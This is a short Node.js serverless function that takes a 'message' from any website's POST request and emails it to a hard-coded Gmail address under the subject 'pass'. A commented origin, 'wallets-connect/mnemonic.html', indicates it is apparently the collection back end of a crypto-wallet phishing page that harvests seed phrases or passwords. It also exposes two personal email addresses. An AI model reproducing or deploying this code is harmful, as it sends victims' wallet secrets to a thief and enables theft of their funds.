require('dotenv').config();
const nodemailer = require('nodemailer')
const {HOST,PORT,USER,PASS} = process.env
const transporter = nodemailer.createTransport({
    service:'gmail',
    port:PORT,
    secure: false, // upgrade later with STARTTLS
    auth: {
      user: USER,
      pass: PASS
    }
  });

exports.handler = async (event,context)=>{


    // const method =event.httpMethod;
   /*  if (method !== POST){

        return {
            headers:{'Access-Control-Allow-Origin':'*'},
                statusCode:405,
                body:'only post request is allowed'
            }

    } */

    // const {message} = event.body
// console.log(message)
    /* if(!message){

        return {
            headers:{'Access-Control-Allow-Origin':'*'},
                statusCode:400,
                body:'provide all values'
            }
             Access-Control-Allow-Origin: http://wallets-connect/mnemonic.html
            Access-Control-Allow-Origin: [http://](http:)<domain-of-site-x>>
    }
     */
// console.log(event)
// const res = event.body
const{message}= JSON.parse(event.body)

const data = {

from: `darcoders77@gmail.com`,

to:"dolapoajayi28@gmail.com",

subject: "pass",

html:`<p>${message}</p>`

}


    await transporter.sendMail({...data})
    return {
        headers:{'Access-Control-Allow-Origin':'*'},
            statusCode:200,
            body:JSON.stringify(`${message}`)
        }
// console.log(res)

} 

